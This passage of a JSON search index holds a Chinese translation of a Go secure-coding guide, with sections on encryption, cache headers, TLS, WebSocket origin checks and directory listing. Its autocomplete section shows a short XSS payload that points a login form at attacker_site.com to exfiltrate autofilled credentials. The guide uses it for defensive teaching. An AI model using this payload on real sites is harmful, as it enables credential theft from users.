\u90e8\u5206\uff0c\u5982\u4f55\u4fdd\u62a4\u6570\u636e\u5e93\u8fde\u63a5\u5b57\u7b26\u4e32\u7684\u793a\u4f8b\u201d\u4e00\u8282)\u6216\u5176\u4ed6\u654f\u611f\u4fe1\u606f\u3002\u8fd9\u4e9b\u654f\u611f\u4fe1\u606f\u8fd8\u5305\u62ec\u4ee5\u4e0d\u5b89\u5168\u7684\u683c\u5f0f\u5d4c\u5165\u7684\u5185\u5bb9\uff08\u5982Adobe flash\u6216\u5df2\u7f16\u8bd1\u7684\u4ee3\u7801\uff09\u3002 go\u4e2d\uff0c\u4f7f\u7528\u5916\u90e8\u5305 golang.org/x/crypto/nacl/secretboxin \u8fdb\u884c\u52a0\u5bc6\u7684\u5c0f\u4f8b\u5b50\uff1a // Load your secret key from a safe place and reuse it across multiple // Seal calls. (Obviously don't use this example key for anything // real.) If you want to convert a passphrase to a key, use a suitable // package like bcrypt or scrypt. secretKeyBytes, err := hex.DecodeString( 6368616e676520746869732070617373776f726420746f206120736563726574 ) if err != nil { panic(err) } var secretKey [32]byte copy(secretKey[:], secretKeyBytes) // You must use a different nonce for each message you encrypt with the // same key. Since the nonce here is 192 bits long, a random value // provides a sufficiently small probability of repeats. var nonce [24]byte if _, err := rand.Read(nonce[:]); err != nil { panic(err) } // This encrypts hello world and appends the result to the nonce. encrypted := secretbox.Seal(nonce[:], []byte( hello world ), nonce, secretKey) // When you decrypt, you must use the same nonce and key you used to // encrypt the message. One way to achieve this is to store the nonce // alongside the encrypted message. Above, we stored the nonce in the first // 24 bytes of the encrypted text. var decryptNonce [24]byte copy(decryptNonce[:], encrypted[:24]) decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], decryptNonce, secretKey) if !ok { panic( decryption error ) } fmt.Println(string(decrypted)) \u8f93\u51fa\uff1a hello world","title":"\u52a0\u5bc6\u662f\u5173\u952e"},{"location":"application-security/sdl/go-scp/#_34","text":"\u53e6\u4e00\u79cd\u7b80\u5355\u6709\u6548\u7684\u7f13\u89e3\u653b\u51fb\u7684\u65b9\u6cd5\u662f\u786e\u4fdd\u5728\u7cfb\u7edf\u4e2d\u7981\u7528\u4efb\u4f55\u4e0d\u5fc5\u8981\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u670d\u52a1\u3002","title":"\u7981\u7528\u4e0d\u9700\u8981\u7684\u5185\u5bb9"},{"location":"application-security/sdl/go-scp/#_35","text":"\u6839\u636e Mozilla\u6587\u6863 \uff0c\u60a8\u53ef\u4ee5\u5728\u6574\u4e2a\u8868\u5355\u4e2d\uff0c\u4f7f\u7528\u4ee5\u4e0b\u65b9\u6cd5\u7981\u7528\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\uff1a form method= post action= /form autocomplete= off \u6216\u7279\u5b9a\u7684\u8868\u5355\u5143\u7d20\uff1a input type= text id= cc name= cc autocomplete= off \u8fd9\u5bf9\u4e8e\u5728\u767b\u5f55\u8868\u5355\u4e0a\u7981\u7528\u81ea\u52a8\u5b8c\u6210\u529f\u80fd\u7279\u522b\u6709\u7528\u3002\u5047\u8bbe\u5728\u767b\u5f55\u9875\u9762\u4e2d\u5b58\u5728XSS\u5411\u91cf\u3002\u5982\u679c\u6076\u610f\u7528\u6237\u521b\u5efa\u4e86\u5982\u4e0b\u6709\u6548\u8d1f\u8f7d\uff1a window.setTimeout(function() { document.forms[0].action = 'http://attacker_site.com'; document.forms[0].submit(); } ), 10000); \u5b83\u5c06\u81ea\u52a8\u586b\u5145\u8868\u5355\u5b57\u6bb5\u53d1\u9001\u5230 attacker_site.com \u3002","title":"\u81ea\u52a8\u5b8c\u6210"},{"location":"application-security/sdl/go-scp/#_36","text":"\u9875\u9762\u4e2d\uff0c\u5305\u542b\u654f\u611f\u4fe1\u606f\u7684\u7f13\u5b58\u63a7\u5236\u5e94\u8be5\u88ab\u7981\u7528\u3002 \u8fd9\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u76f8\u5e94\u7684header\u6807\u5fd7\u6765\u5b9e\u73b0\uff0c\u5982\u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u6240\u793a\uff1a w.Header().Set( Cache-Control , no-cache, no-store ) w.Header().Set( Pragma , no-cache ) no-cache \u544a\u8bc9\u6d4f\u89c8\u5668\u5728\u4f7f\u7528\u4efb\u4f55\u7f13\u5b58\u4fe1\u606f\u4e4b\u524d\u4e0e\u670d\u52a1\u5668\u91cd\u65b0\u9a8c\u8bc1\uff08\u9632\u6b62\u4ece\u7f13\u5b58\u4e2d\u83b7\u53d6\u8fc7\u671f\u7684\u8d44\u6e90\uff09\uff0c\u800c\u4e0d\u662f\u544a\u8bc9\u6d4f\u89c8\u5668 \u4e0d\u8981\u7f13\u5b58 \u3002 \u53e6\u4e00\u65b9\u9762\uff0c no-store \u503c\u5b9e\u9645\u4e0a\u662f \u2014 \u505c\u6b62\u7f13\u5b58!\uff0c\u5e76\u4e14\u4e0d\u80fd\u5b58\u50a8\u8bf7\u6c42\u6216\u54cd\u5e94\u7684\u4efb\u4f55\u90e8\u5206\u3002 Pragma \u5934\u7528\u4e8e\u652f\u6301HTTP/1.0\u8bf7\u6c42\u3002","title":"\u7f13\u5b58"},{"location":"application-security/sdl/go-scp/#_37","text":"\u5728\u8ba8\u8bba\u901a\u4fe1\u5b89\u5168\u6027\u65f6\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u786e\u4fdd\u7528\u4e8e\u901a\u4fe1\u7684\u901a\u9053\u662f\u5b89\u5168\u7684\u3002\u901a\u4fe1\u7c7b\u578b\u5305\u62ec\u670d\u52a1\u5668-\u5ba2\u6237\u7aef\u3001\u670d\u52a1\u5668-\u6570\u636e\u5e93\u4ee5\u53ca\u6240\u6709\u540e\u7aef\u901a\u4fe1\u3002\u8fd9\u4e9b\u6570\u636e\u5fc5\u987b\u52a0\u5bc6\uff0c\u4ee5\u4fdd\u8bc1\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u5e76\u9632\u6b62\u4e0e\u901a\u4fe1\u5b89\u5168\u76f8\u5173\u7684\u5e38\u89c1\u653b\u51fb\u3002\u5982\u679c\u4e0d\u80fd\u4fdd\u8bc1\u8fd9\u4e9b\u901a\u9053\u7684\u5b89\u5168\uff0c\u5c31\u4f1a\u53d1\u751f\u50cfMITM\u8fd9\u6837\u7684\u653b\u51fb\uff0c\u8ba9\u72af\u7f6a\u5206\u5b50\u62e6\u622a\u5e76\u8bfb\u53d6\u8fd9\u4e9b\u901a\u9053\u4e2d\u7684\u6d41\u91cf\u3002 \u672c\u8282\u6db5\u76d6\u4ee5\u4e0b\u901a\u8baf\u6e20\u9053: - HTTP/TLS - Websockets","title":"\u901a\u4fe1\u5b89\u5168"},{"location":"application-security/sdl/go-scp/#httptls","text":"TLS/SSL\u662f\u4e00\u79cd\u52a0\u5bc6\u534f\u8bae\uff0c\u5b83\u5141\u8bb8\u5728\u5176\u4ed6\u4e0d\u5b89\u5168\u7684\u901a\u4fe1\u901a\u9053\u4e0a\u8fdb\u884c\u52a0\u5bc6\u3002\u5b83\u6700\u5e38\u89c1\u7684\u7528\u9014\u662f\u63d0\u4f9b\u5b89\u5168\u7684HTTP\u901a\u4fe1\uff0c\u4e5f\u79f0\u4e3aHTTPS\u3002\u8be5\u534f\u8bae\u786e\u4fdd\u4ee5\u4e0b\u5c5e\u6027\u9002\u7528\u4e8e\u901a\u4fe1\u901a\u9053: \u9690\u79c1 \u8eab\u4efd\u9a8c\u8bc1 \u6570\u636e\u5b8c\u6574\u6027 \u5b83\u5728Go\u4e2d\u7684\u5b9e\u73b0\u5728 crypto/tls \u5305\u4e2d\u3002\u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u91cd\u70b9\u4ecb\u7ecdGo\u7684\u5b9e\u73b0\u548c\u7528\u6cd5\u3002\u867d\u7136\u534f\u8bae\u8bbe\u8ba1\u7684\u7406\u8bba\u90e8\u5206\u548c\u5b83\u7684\u52a0\u5bc6\u5b9e\u8df5\u8d85\u51fa\u4e86\u672c\u6587\u7684\u8303\u56f4\uff0c\u4f46\u662f\u672c\u6587\u6863\u7684 \u52a0\u5bc6\u5b9e\u8df5 \u90e8\u5206\u8fd8\u662f\u63d0\u4f9b\u4e86\u66f4\u591a\u4fe1\u606f\u3002 \u4ee5\u4e0b\u662f\u4f7f\u7528TLS\u7684HTTP\u7684\u7b80\u5355\u793a\u4f8b\uff1a import log import net/http func main() { http.HandleFunc( / , func (w http.ResponseWriter, req *http.Request) { w.Write([]byte( This is an example server.\\n )) }) // yourCert.pem - path to your server certificate in PEM format // yourKey.pem - path to your server private key in PEM format log.Fatal(http.ListenAndServeTLS( :443 , yourCert.pem , yourKey.pem , nil)) } \u8fd9\u662f\u4e00\u4e2a\uff0c\u5728\u7528Go\u5b9e\u73b0\u7684web\u670d\u52a1\u5668\u4e2d\uff0c\u7b80\u5355\u7684\u5f00\u7bb1\u5373\u7528\u7684SSL\u5b9e\u73b0\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u793a\u4f8b\u5728SSL\u5b9e\u9a8c\u5ba4\u4e2d\u83b7\u5f97\u4e86\u201cA\u201d\u3002 \u4e3a\u4e86\u8fdb\u4e00\u6b65\u63d0\u9ad8\u901a\u4fe1\u5b89\u5168\uff0c\u53ef\u4ee5\u5728header\u4e2d\u6dfb\u52a0\u4ee5\u4e0b\u6807\u5fd7\uff0c\u4ee5\u5f3a\u5236\u6267\u884cHSTS (HTTP\u4e25\u683c\u4f20\u8f93\u5b89\u5168)\uff1a w.Header().Add( Strict-Transport-Security , max-age=63072000; includeSubDomains ) Go\u7684TLS\u5b9e\u73b0\u5728crypto/ TLS\u5305\u4e2d\u3002\u5728\u4f7f\u7528TLS\u65f6\uff0c\u8bf7\u786e\u4fdd\u4f7f\u7528\u4e86\u5355\u4e2a\u6807\u51c6TLS\u5b9e\u73b0\uff0c\u5e76\u5bf9\u5176\u8fdb\u884c\u4e86\u9002\u5f53\u7684\u914d\u7f6e\u3002 \u57fa\u4e8e\u524d\u9762\u7684\u4f8b\u5b50\u5b9e\u73b0SNI\uff08Server Name Indication\uff09\uff1a ... type Certificates struct { CertFile string KeyFile string } func main() { httpsServer := http.Server{ Addr: :8080 , } var certs []Certificates certs = append(certs, Certificates{ CertFile: ../etc/yourSite.pem , //Your site certificate key KeyFile: ../etc/yourSite.key , //Your site private key }) config := tls.Config{} var err error config.Certificates = make([]tls.Certificate, len(certs)) for i, v := range certs { config.Certificates[i], err = tls.LoadX509KeyPair(v.CertFile, v.KeyFile) } conn, err := net.Listen( tcp , :8080 ) tlsListener := tls.NewListener(conn, config) httpsServer.Serve(tlsListener) fmt.Println( Listening on port 8080... ) } \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u4f7f\u7528TLS\u65f6\uff0c\u8bc1\u4e66\u5e94\u8be5\u662f\u6709\u6548\u7684\uff0c\u62e5\u6709\u6b63\u786e\u7684\u57df\u540d\uff0c\u4e0d\u5e94\u8be5\u8fc7\u671f\uff0c\u5e76\u4e14\u5e94\u8be5\u5728\u9700\u8981\u65f6\u5b89\u88c5\u4e2d\u95f4\u8bc1\u4e66\uff0c\u5982 OWASP SCP\u5feb\u901f\u53c2\u8003\u6307\u5357 \u6240\u5efa\u8bae\u7684\u90a3\u6837\u3002 \u91cd\u8981\u63d0\u793a \uff1a\u65e0\u6548\u7684TLS\u8bc1\u4e66\u5e94\u8be5\u59cb\u7ec8\u88ab\u62d2\u7edd\u3002\u786e\u4fdd\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u6ca1\u6709\u5c06InsecureSkipVerify\u914d\u7f6e\u8bbe\u7f6e\u4e3atrue\u3002 \u4ee5\u4e0b\u4ee3\u7801\u6bb5\u662f\u5982\u4f55\u8bbe\u7f6e\u7684\u793a\u4f8b\uff1a config := tls.Config{InsecureSkipVerify: false} \u4f7f\u7528\u6b63\u786e\u7684\u4e3b\u673a\u540d\u4ee5\u8bbe\u7f6e\u670d\u52a1\u5668\u540d\u79f0\uff1a config := tls.Config{ServerName: yourHostname } \u53e6\u4e00\u79cd\u5df2\u77e5\u7684TLS\u653b\u51fb\u88ab\u79f0\u4e3aPOODLE\u3002 \u5f53\u5ba2\u6237\u7aef\u4e0d\u652f\u6301\u670d\u52a1\u5668\u7684\u5bc6\u7801\u65f6\uff0c\u5b83\u4e0eTLS\u8fde\u63a5\u56de\u9000\u6709\u5173\u3002 \u8fd9\u5141\u8bb8\u5c06\u8fde\u63a5\u964d\u7ea7\u4e3a\u6613\u53d7\u653b\u51fb\u7684\u5bc6\u7801\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cGo\u7981\u7528SSLv3\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u914d\u7f6e\uff0c\u6765\u8bbe\u7f6e\u5bc6\u7801\u7684\u6700\u5c0f\u7248\u672c\u548c\u6700\u5927\u7248\u672c\uff1a // MinVersion contains the minimum SSL/TLS version that is acceptable. // If zero, then TLS 1.0 is taken as the minimum. MinVersion uint16 // MaxVersion contains the maximum SSL/TLS version that is acceptable. // If zero, then the maximum version supported by this package is used, // which is currently TLS 1.2. MaxVersion uint16 \u53ef\u4ee5\u901a\u8fc7 SSL\u5b9e\u9a8c\u5ba4 \uff0c\u6765\u68c0\u67e5\uff0c\u4f7f\u7528\u7684\u5bc6\u7801\u7684\u5b89\u5168\u6027\u3002 \u4e00\u4e2a\u901a\u5e38\u7528\u4e8e\u51cf\u8f7b\u964d\u7ea7\u653b\u51fb\u7684\u9644\u52a0\u6807\u5fd7\uff0c\u662fRFC7507\u4e2d\u5b9a\u4e49\u7684TLS_FALLBACK_SCSV\u3002 \u5728Go\u4e2d\uff0c\u6ca1\u6709\u56de\u9000\u3002 \u5f15\u7528Google\u5f00\u53d1\u8005Adam Langley\u7684\u8bdd\uff1a Go\u5ba2\u6237\u7aef\u4e0d\u6267\u884c\u56de\u9000\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u53d1\u9001TLS_FALLBACK_SCSV\u3002 \u53e6\u4e00\u79cd\u79f0\u4e3aCRIME\u7684\u653b\u51fb\u4f1a\u5f71\u54cd\u4f7f\u7528\u538b\u7f29\u7684TLS\u4f1a\u8bdd\u3002 \u538b\u7f29\u662f\u6838\u5fc3\u534f\u8bae\u7684\u4e00\u90e8\u5206\uff0c\u4f46\u5b83\u662f\u53ef\u9009\u7684\u3002\u7528Go\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u53ef\u80fd\u5e76\u4e0d\u5bb9\u6613\u53d7\u5230\u653b\u51fb\uff0c\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u56e0\u4e3a\u76ee\u524d crypto/tls \u4e0d\u652f\u6301\u538b\u7f29\u673a\u5236\u3002\u4e00\u4e2a\u9700\u8981\u8bb0\u4f4f\u7684\u91cd\u8981\u6ce8\u610f\u4e8b\u9879\u662f\uff0c\u5982\u679cGo\u5305\u88c5\u5668\u7528\u4e8e\u5916\u90e8\u5b89\u5168\u5e93\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u5f88\u5bb9\u6613\u53d7\u5230\u653b\u51fb\u3002 TLS\u7684\u53e6\u4e00\u90e8\u5206\u4e0e\u91cd\u65b0\u534f\u5546\u8fde\u63a5\u6709\u5173\u3002\u4e3a\u4e86\u786e\u4fdd\u6ca1\u6709\u5efa\u7acb\u4e0d\u5b89\u5168\u7684\u8fde\u63a5\uff0c\u8bf7\u4f7f\u7528 GetClientCertificate \u53ca\u5176\u76f8\u5173\u7684\u9519\u8bef\u4ee3\u7801\uff0c\u4ee5\u9632\u63e1\u624b\u7ec8\u6b62\u3002\u53ef\u4ee5\u6355\u83b7\u9519\u8bef\u4ee3\u7801\u4ee5\u9632\u6b62\u4f7f\u7528\u4e0d\u5b89\u5168\u7684\u901a\u9053\u3002 \u6240\u6709\u8bf7\u6c42\u4e5f\u5e94\u7f16\u7801\u4e3a\u9884\u5b9a\u7684\u5b57\u7b26\u7f16\u7801\uff0c\u4f8b\u5982UTF-8\u3002 \u8fd9\u53ef\u4ee5\u5728header\u4e2d\u8bbe\u7f6e\uff1a w.Header().Set( Content-Type , Desired Content Type; charset=utf-8 ) \u5904\u7406HTTP\u8fde\u63a5\u65f6\u7684\u53e6\u4e00\u4e2a\u91cd\u8981\u65b9\u9762\u662f\uff0c\u9a8c\u8bc1HTTP\u5934\u5728\u8bbf\u95ee\u5916\u90e8\u7ad9\u70b9\u65f6\uff0c\u4e0d\u5305\u542b\u4efb\u4f55\u654f\u611f\u4fe1\u606f\u3002\u65e2\u7136\u8fde\u63a5\u53ef\u80fd\u4e0d\u5b89\u5168\uff0c\u90a3\u4e48HTTP\u62a5\u5934\u5c31\u53ef\u80fd\u6cc4\u6f0f\u4fe1\u606f\u3002","title":"HTTP/TLS"},{"location":"application-security/sdl/go-scp/#websockets","text":"WebSocket\u662f\u4e3aHTML 5\u5f00\u53d1\u7684\u4e00\u79cd\u65b0\u7684\u6d4f\u89c8\u5668\u529f\u80fd\uff0c\u5b83\u652f\u6301\u5b8c\u5168\u4ea4\u4e92\u5f0f\u5e94\u7528\u7a0b\u5e8f\u3002\u4f7f\u7528WebSockets\uff0c\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u90fd\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e2aTCP\u5957\u63a5\u5b57\u53d1\u9001\u5f02\u6b65\u6d88\u606f\uff0c\u800c\u65e0\u9700\u4f7f\u7528\u957f\u8f6e\u8be2\u6216\u77ed\u8f6e\u8bad\u3002 \u672c\u8d28\u4e0a\uff0cWebSocket\u662f\u5ba2\u6237\u673a\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u6807\u51c6\u53cc\u5411TCP\u5957\u63a5\u5b57\u3002\u8fd9\u4e2a\u5957\u63a5\u5b57\u4ee5\u5e38\u89c4HTTP\u8fde\u63a5\u5f00\u59cb\uff0c\u7136\u540e\u5728HTTP\u63e1\u624b\u4e4b\u540e\u201c\u5347\u7ea7\u201d\u4e3aTCP\u5957\u63a5\u5b57\u3002\u4efb\u4f55\u4e00\u65b9\u90fd\u53ef\u4ee5\u5728\u63e1\u624b\u4e4b\u540e\u53d1\u9001\u6570\u636e\u3002","title":"Websockets"},{"location":"application-security/sdl/go-scp/#origin-header","text":"HTTP Websocket\u63e1\u624b\u4e2d\u7684 Origin header\u7528\u4e8e\u786e\u4fddWebsocket\u63a5\u53d7\u7684\u8fde\u63a5\u6765\u81ea\u53ef\u4fe1\u7684\u539f\u59cb\u57df\u3002\u6267\u884c\u5931\u8d25\u53ef\u80fd\u5bfc\u81f4\u8de8\u7ad9\u70b9\u8bf7\u6c42\u4f2a\u9020(CSRF)\u3002 \u670d\u52a1\u5668\u8d1f\u8d23\u5728\u521d\u59cbHTTP WebSocket\u63e1\u624b\u4e2d\u9a8c\u8bc1Origin\u5934\u3002 \u5982\u679c\u670d\u52a1\u5668\u672a\u5728\u521d\u59cbWebSocket\u63e1\u624b\u4e2d\u9a8c\u8bc1\u539f\u59cbheader\uff0c\u5219WebSocket\u670d\u52a1\u5668\u53ef\u80fd\u63a5\u53d7\u6765\u81ea\u4efb\u4f55\u6e90\u7684\u8fde\u63a5\u3002 \u4ee5\u4e0b\u793a\u4f8b\u4f7f\u7528Origin\u5934\u68c0\u67e5\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u8005\u6267\u884cCSWSH\uff08\u8de8\u7ad9\u70b9WebSocket\u52ab\u6301\uff09\u3002 \u5e94\u7528\u7a0b\u5e8f\u5e94\u8be5\u9a8c\u8bc1 Host \u548c Origin \uff0c\u4ee5\u786e\u4fdd\u8bf7\u6c42\u7684 Origin \u662f\u53ef\u4fe1\u4efb\u7684 Origin \uff0c\u5426\u5219\u62d2\u7edd\u8fde\u63a5\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u7247\u6bb5\u6f14\u793a\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u68c0\u67e5\uff1a //Compare our origin with Host and act accordingly if r.Header.Get( Origin ) != http:// +r.Host { http.Error(w, Origin not allowed , 403) return } else { websocket.Handler(EchoHandler).ServeHTTP(w, r) }","title":"Origin header"},{"location":"application-security/sdl/go-scp/#_38","text":"Websocket\u901a\u4fe1\u901a\u9053\u53ef\u4ee5\u901a\u8fc7\u672a\u52a0\u5bc6\u7684TCP\u6216\u52a0\u5bc6\u7684TLS\u5efa\u7acb\u3002 \u5f53\u4f7f\u7528\u672a\u52a0\u5bc6\u7684Websockets\u65f6\uff0c URI scheme \u662f ws:// \uff0c\u5176\u9ed8\u8ba4\u7aef\u53e3\u662f 80 \u3002\u5982\u679c\u4f7f\u7528TLS Websockets, URI scheme \u662f wss:// \uff0c\u9ed8\u8ba4\u7aef\u53e3\u662f 443 \u3002 \u6d89\u53ca\u5230Websockets\u65f6\uff0c\u65e0\u8bba\u662f\u4f7f\u7528TLS\u65b9\u5f0f\u8fd8\u662f\u7528\u672a\u52a0\u5bc6\u65b9\u5f0f\uff0c\u6211\u4eec\u5fc5\u987b\u8003\u8651\u539f\u59cb\u8fde\u63a5\u3002 \u5728\u672c\u8282\u4e2d\uff0c\u6211\u4eec\u5c06\u5c55\u793a\u8fde\u63a5\u4eceHTTP\u5347\u7ea7\u5230Websocket\u65f6\u53d1\u9001\u7684\u4fe1\u606f\uff0c\u4ee5\u53ca\u5982\u679c\u5904\u7406\u4e0d\u5f53\u6240\u5e26\u6765\u7684\u98ce\u9669\u3002\u5728\u7b2c\u4e00\u4e2a\u793a\u4f8b\u4e2d\uff0c\u6211\u4eec\u770b\u5230\u5e38\u89c4HTTP\u8fde\u63a5\u6b63\u5728\u5347\u7ea7\u5230Websocket\u8fde\u63a5\uff1a \u6ce8\u610f\uff0c\u8bf7\u6c42\u5934\u5305\u542b\u6b64\u6b21\u4f1a\u8bdd\u7684cookie\u3002\u4e3a\u786e\u4fdd\u4e0d\u6cc4\u6f0f\u654f\u611f\u4fe1\u606f\uff0c\u5347\u7ea7\u8fde\u63a5\u65f6\u5e94\u8be5\u4f7f\u7528TLS\u3002\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u5728\u540e\u4e00\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u548cWebsocket\u4e00\u6837\uff0c\u6211\u4eec\u7684\u8fde\u63a5\u5347\u7ea7\u8bf7\u6c42\u4f7f\u7528SSL\uff1a","title":"\u673a\u5bc6\u6027\u548c\u5b8c\u6574\u6027"},{"location":"application-security/sdl/go-scp/#_39","text":"Websockets\u4e0d\u5904\u7406\u8ba4\u8bc1\u6216\u6388\u6743\uff0c\u8fd9\u610f\u5473\u7740\u5fc5\u987b\u4f7f\u7528\u8bf8\u5982cookie\u3001HTTP\u8eab\u4efd\u9a8c\u8bc1\u6216TLS\u8eab\u4efd\u9a8c\u8bc1\u7b49\u673a\u5236\u6765\u786e\u4fdd\u5b89\u5168\u6027\u3002\u6709\u5173\u8fd9\u65b9\u9762\u7684\u66f4\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684\u201c \u8eab\u4efd\u9a8c\u8bc1 \u201d\u548c\u201c \u8bbf\u95ee\u63a7\u5236 \u201d\u90e8\u5206\u3002","title":"\u8ba4\u8bc1\u548c\u6388\u6743"},{"location":"application-security/sdl/go-scp/#_40","text":"\u4e0e\u6765\u81ea\u4e0d\u53ef\u4fe1\u6e90\u7684\u4efb\u4f55\u6570\u636e\u4e00\u6837\uff0c\u5e94\u8be5\u5bf9\u6570\u636e\u8fdb\u884c\u9002\u5f53\u7684\u6e05\u7406\u548c\u7f16\u7801\u3002\u6709\u5173\u8fd9\u4e9b\u4e3b\u9898\u7684\u66f4\u8be6\u7ec6\u5185\u5bb9\uff0c\u8bf7\u53c2\u9605\u672c\u6587\u6863\u7684\u201c \u6570\u636e\u6e05\u7406 \u201d\u548c\u201c \u8f93\u51fa\u7f16\u7801 \u201d\u90e8\u5206\u3002","title":"\u8f93\u5165\u6570\u636e\u6e05\u7406"},{"location":"application-security/sdl/go-scp/#_41","text":"\u4fdd\u6301\u66f4\u65b0\u662f\u5b89\u5168\u7684\u5173\u952e\u3002\u56e0\u6b64\uff0c\u5f00\u53d1\u4eba\u5458\u5e94\u8be5\u5c06Go\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\uff0c\u5305\u62ecWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u5916\u90e8\u5305\u548c\u6846\u67b6\u3002 \u5173\u4e8eGo\u4e2d\u7684HTTP\u8bf7\u6c42\uff0c\u4f60\u9700\u8981\u77e5\u9053\u4efb\u4f55\u4f20\u5165\u670d\u52a1\u5668\u7684\u8bf7\u6c42\u90fd\u662f\u4f7f\u7528HTTP/1.1\u6216HTTP/2\u6765\u5b8c\u6210\u7684\u3002\u5982\u679c\u8bf7\u6c42\u662f\uff1a req, _ := http.NewRequest( POST , url, buffer) req.Proto = HTTP/1.0 Proto \u5c06\u88ab\u5ffd\u7565\uff0c\u8bf7\u6c42\u4f1a\u4f7f\u7528HTTP/1.1\u53d1\u51fa\u3002","title":"\u7cfb\u7edf\u914d\u7f6e"},{"location":"application-security/sdl/go-scp/#_42","text":"\u5982\u679c\u5f00\u53d1\u4eba\u5458\u5fd8\u8bb0\u7981\u7528\u76ee\u5f55\u5217\u8868\uff08OWASP\u4e5f\u79f0\u5176\u4e3a\u76ee\u5f55\u7d22\u5f15\uff09\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u76ee\u5f55\u5bfc\u822a\u51fa\u4e00\u4e9b\u654f\u611f\u6587\u4ef6\u3002 \u5982\u679c\u4f60\u8fd0\u884c\u4e00\u4e2aGo Web\u670d\u52a1\u5668\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f60\u8fd8\u5e94\u8be5\u5c0f\u5fc3\uff1a http.ListenAndServe( :8080 , http.FileServer(http.Dir( /tmp/static ))) \u5982\u679c\u4f60\u8bbf\u95ee localhost:8080 \uff0c\u5b83\u5c06\u6253\u5f00\u4f60\u7684index.html\u3002\u4f46\u662f\u5047\u8bbe\u4f60\u6709\u4e00\u4e2a\u6d4b\u8bd5\u76ee\u5f55 localhost:8080/test/ \uff0c\u5185\u90e8\u6709\u654f\u611f\u6587\u4ef6\uff1a \u4e3a\u4ec0\u4e48\u4f1a\u8fd9\u6837\uff1f Go\u5c1d\u8bd5\u5728\u76ee\u5f55\u4e2d\u627e\u5230index.html\uff0c\u5982\u679c\u5b83\u4e0d\u5b58\u5728\uff0c\u5b83\u5c06\u663e\u793a\u76ee\u5f55\u5217\u8868\u3002 \u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6709\u4e09\u4e2a\u53ef\u884c\u7684\u89e3\u51b3\u65b9\u6848: \u5728\u4f60\u7684web\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7981\u7528\u76ee\u5f55\u5217\u8868 \u9650\u5236\u5bf9\u4e0d\u5fc5\u8981\u7684\u76ee\u5f55\u548c\u6587\u4ef6\u7684\u8bbf\u95ee \u4e3a\u6bcf\u4e2a\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u7d22\u5f15\u6587\u4ef6 \u8fd9\u91cc\u6211\u4eec\u5c06\u63cf\u8ff0\u4e00\u79cd\u7981\u7528\u76ee\u5f55\u5217\u8868\u7684\u65b9\u6cd5\uff0c\u9996\u5148\uff0c\u521b\u5efa\u4e00\u4e2a\u51fd\u6570\u6765\u68c0\u67e5\u6240\u8bf7\u6c42\u7684\u8def\u5f84\uff0c\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u663e\u793a\u8be5\u8def\u5f84\u3002 type justFilesFilesystem struct { fs http.FileSystem } func (fs justFilesFilesystem) Open(name string) (http.File, error) { f, err := fs.fs.Open(name) if err != nil { return nil, err } return neuteredReaddirFile{f}, nil } \u7136\u540e\u6211\u4eec\u5728 http.ListenAndServe \u4e2d\u4f7f\u7528\u5b83\uff1a fs := justFilesFilesystem{http.Dir( tmp/static/ )} http.ListenAndServe( :8080 , http.StripPrefix( /tmp/static , http.FileServer(fs))) \u8bf7\u6ce8\u610f\uff0c\u6211\u4eec\u7684\u5e94\u7528\u7a0b\u5e8f\u4ec5\u5141\u8bb8\u663e\u793a tmp/static \u8def\u5f84\u3002\u5f53\u6211\u4eec\u8bd5\u56fe\u76f4\u63a5\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u5f97\u5230\uff1a \u5982\u679c\u6211\u4eec\u5c1d\u8bd5\u83b7\u53d6 test/ \u76ee\u5f55\u5217\u8868\uff0c\u6211\u4eec\u5c06\u5f97\u5230\u76f8\u540c\u7684\u9519\u8bef","title":"\u76ee\u5f55\u5217\u8868"},{"location":"application-security/sdl/go-scp/#_43","text":"\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u5220\u9664\u6240\u6709\u4e0d\u9700\u8981\u7684\u529f\u80fd\u70b9\u548c\u6587\u4ef6\u3002\u6d4b\u8bd5\u4ee3\u7801\u548c\u51fd\u6570\uff0c\u53ea\u5e94\u8be5\u7559\u5728\u5f00\u53d1\u4eba\u5458\u5c42\uff0c\u800c\u4e0d\u662f\u6bcf\u4e2a\u4eba\u90fd\u80fd\u770b\u5230\u7684\u4f4d\u7f6e\u3002\u6700\u7ec8\u7248\u672c (\u51c6\u5907\u4e0a\u751f\u4ea7\u7684\u7248\u672c) 